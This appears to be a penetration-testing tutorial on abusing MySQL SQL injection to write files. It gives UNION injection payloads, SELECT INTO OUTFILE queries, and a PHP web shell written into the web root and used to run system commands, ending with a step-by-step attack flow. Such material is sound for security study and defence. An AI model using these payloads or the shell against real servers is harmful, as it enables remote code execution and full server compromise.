
# Writing Files via SQL Injection

Reading files from a server is dangerous, but writing files is even more critical because it can lead directly to Remote Code Execution (RCE). If an attacker can write files into the web server's document root, they may be able to upload a web shell and completely compromise the server.

Modern database systems restrict file-writing functionality by default because of this risk. Before attempting to write files, an attacker must verify that the required privileges and configurations allow it.

---

# Requirements for Writing Files

To write files through a MySQL/MariaDB database, three conditions must be met:

1. The database user must have the `FILE` privilege.
2. The `secure_file_priv` variable must not restrict file operations.
3. The operating system must allow writing to the target directory.

If any of these conditions fail, file writing will not be possible.

---

# Understanding `secure_file_priv`

The `secure_file_priv` variable controls where MySQL is allowed to read and write files.

Possible values:

| Value | Meaning |
|---------|---------|
| Empty (`''`) | Read/write allowed anywhere |
| Directory Path | Read/write restricted to that directory |
| NULL | Read/write disabled completely |

Examples:

```text
''                    → Any location
/var/lib/mysql-files  → Only this directory
NULL                  → No file operations allowed
````

---

# Checking `secure_file_priv`

Normally:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Since SQL Injection often requires `SELECT` statements, the same information can be retrieved from `information_schema.global_variables`.

---

# Query

```sql
SELECT variable_name, variable_value
FROM information_schema.global_variables
WHERE variable_name="secure_file_priv";
```

---

# UNION Injection Example

```sql
cn' UNION SELECT
1,
variable_name,
variable_value,
4
FROM information_schema.global_variables
WHERE variable_name="secure_file_priv"-- -
```

---

# Example Result

```text
secure_file_priv
(empty)
```

An empty value means file read and write operations are allowed throughout the filesystem.

---

# Writing Files with `SELECT INTO OUTFILE`

MySQL provides:

```sql
SELECT ... INTO OUTFILE
```

This statement writes query output directly into a file on disk.

---

# Exporting Table Data

Example:

```sql
SELECT *
FROM users
INTO OUTFILE '/tmp/credentials';
```

Result:

```text
1 admin    392037dbba51f692776d6cefb6dd546d
2 newuser  9da2c9bcdf39d8610954e0e11ea8f45f
```

The file is created on the server and contains the query results.

---

# Writing Arbitrary Text Files

Instead of exporting table contents, arbitrary strings can also be written.

Example:

```sql
SELECT 'this is a test'
INTO OUTFILE '/tmp/test.txt';
```

Contents:

```text
this is a test
```

File ownership:

```text
-rw-rw-rw- 1 mysql mysql ...
```

The file is owned by the MySQL service account.

---

# Writing Files Through SQL Injection

Suppose we want to verify write permissions inside the web root.

Query:

```sql
SELECT 'file written successfully!'
INTO OUTFILE '/var/www/html/proof.txt';
```

---

# UNION Injection Version

```sql
cn' UNION SELECT
1,
'file written successfully!',
3,
4
INTO OUTFILE '/var/www/html/proof.txt'-- -
```

If no database errors appear, the operation likely succeeded.

---

# Verifying the File

Visit:

```text
http://SERVER_IP/proof.txt
```

Expected output:

```text
1 file written successfully! 3 4
```

The entire UNION query output is written into the file.

---

# Finding the Web Root

Before writing a web shell, the attacker must know where the web server stores files.

Common locations:

### Apache

```text
/etc/apache2/apache2.conf
```

### Nginx

```text
/etc/nginx/nginx.conf
```

### IIS

```text
%WinDir%\System32\Inetsrv\Config\ApplicationHost.config
```

These files can often be read using:

```sql
LOAD_FILE()
```

---

# Writing a PHP Web Shell

A simple PHP web shell:

```php
<?php system($_REQUEST[0]); ?>
```

This shell executes commands supplied through the HTTP parameter `0`.

---

# Writing the Web Shell

```sql
cn' UNION SELECT
"",
'<?php system($_REQUEST[0]); ?>',
"",
""
INTO OUTFILE '/var/www/html/shell.php'-- -
```

If successful, a new file called:

```text
/var/www/html/shell.php
```

will be created.

---

# Executing Commands

Visit:

```text
http://SERVER_IP/shell.php?0=id
```

Example output:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

This confirms command execution on the server.

---

# Typical Attack Flow

```text
1. Identify SQL Injection
2. Enumerate current DB user
3. Check FILE privilege
4. Check secure_file_priv
5. Verify writable location
6. Write proof file
7. Write web shell
8. Execute OS commands
9. Gain server access
```

---

# Important Functions and Variables

| Item                                  | Purpose                                |
| ------------------------------------- | -------------------------------------- |
| `FILE`                                | Required privilege for file operations |
| `secure_file_priv`                    | Controls file read/write locations     |
| `LOAD_FILE()`                         | Reads files from the OS                |
| `SELECT INTO OUTFILE`                 | Writes files to disk                   |
| `information_schema.global_variables` | Stores MySQL configuration variables   |

---

# Security Impact

Successful file writing through SQL Injection can lead to:

* Arbitrary file creation
* Source code modification
* Configuration tampering
* Web shell deployment
* Remote Command Execution
* Complete server compromise

Because of this, file-write vulnerabilities are considered one of the most severe outcomes of a SQL Injection attack.
